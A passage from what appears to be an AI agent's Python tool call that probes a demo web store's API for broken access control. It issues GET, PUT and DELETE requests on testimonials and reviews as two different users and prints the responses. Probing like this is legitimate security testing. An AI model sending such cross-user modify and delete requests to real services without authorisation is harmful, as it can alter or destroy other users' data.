de))\nprint(resp_a.text[:500])\nprint()\n\nresp_b = requests.put(\"https://duck-store.escape.tech/api/v1/testimonials/18\", headers=headers_b, json=update_data)\nprint(\"PUT /api/v1/testimonials/18 as user_b: \" + str(resp_b.status_code))\nprint(resp_b.text[:500])\nprint()\n\n# Test DELETE\nresp_a = requests.delete(\"https://duck-store.escape.tech/api/v1/testimonials/18\", headers=headers_a)\nprint(\"DELETE /api/v1/testimonials/18 as user_a: \" + str(resp_a.status_code))\nprint(resp_a.text[:500])\nprint()\n\n# Test reviews endpoints with IDs\nresp_a = requests.get(\"https://duck-store.escape.tech/api/v1/reviews/14\", headers=headers_a)\nprint(\"GET /api/v1/reviews/14 as user_a: \" + str(resp_a.status_code))\nprint(resp_a.text[:500])\nprint()\n\n# Check if there's a reviews endpoint for a specific review\n# The review from earlier had id 14, user_id usera_test2\n# Let's try to access it as user_b\nresp_b = requests.get(\"https://duck-store.escape.tech/api/v1/reviews/14\", headers=headers_b)\nprint(\"GET /api/v1/reviews/14 as user_b: \" + str(resp_b.status_code))\nprint(resp_b.text[:500])\nPYEOF"}
